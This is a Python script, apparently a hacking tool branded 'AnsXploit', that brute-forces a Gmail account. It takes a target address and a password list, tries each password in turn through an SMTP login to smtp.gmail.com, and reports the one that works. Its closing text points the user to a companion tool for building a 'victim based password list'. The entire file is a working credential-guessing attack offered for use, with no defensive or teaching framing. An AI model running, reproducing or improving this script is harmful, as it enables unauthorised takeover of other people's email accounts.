import smtplib
import os
import sys
import time

os.system("clear")

red = '\033[31m'
yellow = '\033[93m'
green = '\033[92m'
blue = '\033[94m'
magenta = '\033[95m'
cyan = '\033[96m'
white = '\033[97m'
clear = '\033[0m'
bold = '\033[01m'

def hprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(8.0 / 100)

# Tampilan kotak berwarna-warni
print(bold + cyan + "╔" + "═" * 58 + "╗")
print("║" + yellow + "   :::=====  :::=======  :::====  ::: :::     " + cyan + "║")
print("║" + yellow + "   :::       ::: === === :::  === ::: :::     " + cyan + "║")
print("║" + yellow + "   === ===== === === === ======== === ===     " + cyan + "║")
print("║" + yellow + "   ===   === ===     === ===  === === ===     " + cyan + "║")
print("║" + yellow + "    =======  ===     === ===  === === ======= " + cyan + "║")
print("║" + green  + "   :::====  :::====  :::  === :::==== :::=====" + cyan + "║")
print("║" + green  + "   :::  === :::  === :::  === :::==== :::     " + cyan + "║")
print("║" + green  + "   =======  =======  ===  ===   ===   ======  " + cyan + "║")
print("║" + green  + "   ===  === === ===  ===  ===   ===   ===     " + cyan + "║")
print("║" + green  + "   =======  ===  ===  ======    ===   ======= " + cyan + "║")
print("╚" + "═" * 58 + "╝" + clear)

# Info owner dalam kotak
print(bold + blue + "╔" + "═" * 58 + "╗")
hprint(blue + "║" + white + "    [✓] Owner  : AnsXploit" + " " * 25 + blue + "║")
hprint(blue + "║" + white + "    [✓] Github : github.com/AnsXploit504" + " " * 14 + blue + "║")
print("╚" + "═" * 58 + "╝" + clear)

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("  Enter The Target Gmail : " + yellow)

print("\n")

passswfile = input(green + "  Enter Password list path  : " + yellow )

passswfile = open(passswfile, "r").readlines()

if not user.endswith("@gmail.com"):
          print(red,"Only Gmail accounts can be bruteforced with this tool")
          sys.exit()

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print(green,"[+] Password Found <==> %s\n" % password)
        break


    except smtplib.SMTPAuthenticationError:
        print(yellow,"\n [!] Password incorrect <==> %s \n" % password)
hprint(green + """
            Use Passmaker by me for making a victim based password list """) 
print("""            apt update 

        apt upgrade

        apt install python
 
        apt install git

        git clone https://github.com/Anontemitayo/Passmaker

        cd Passmaker

        Run

        For termux :

        python Passmaker.py

        For Linux

        python3 Passmaker.py """)

hprint("\n Don't forget to follow me for more tools💘")